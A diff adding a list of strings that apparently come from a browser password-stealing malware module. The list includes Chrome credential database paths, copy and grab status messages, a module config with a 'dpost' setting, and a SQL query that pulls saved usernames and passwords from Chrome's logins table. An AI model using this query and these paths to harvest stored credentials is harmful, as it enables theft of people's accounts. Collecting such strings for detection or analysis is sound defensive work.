@@ -1,0 +1,19 @@
+Software\Microsoft\Internet Explorer\IntelliForms\Storage2
+<moduleconfig><autostart>yes</autostart><all>yes</all><needinfo name="id"/><needinfo name="ip"/><autoconf><conf ctl="dpost" file="dpost" period="60"/></autoconf></moduleconfig>
+Chrome login db should be copied
+Chrome webdata db should be copied
+Chrome login db should be copied (copy absent)
+Chrome webdata db should be copied (copy absent)
+Chrome login db copied
+Chrome webdata db copied
+Chrome login db copy failure
+Chrome webdata db copy failure
+Skip Chrome login db copy
+Skip Chrome history db copy
+Grab_Passwords_Chrome(0)
+Grab_Passwords_Chrome(1)
+Grab_Passwords_Chrome(2)
+\Google\Chrome\User Data\Default\Login Data.bak
+Grab_Passwords_Chrome(): Can't open database
+select origin_url, username_value, password_value, length(password_value) from logins where blacklisted_by_user = 0
+Grab_Passwords_Chrome() success
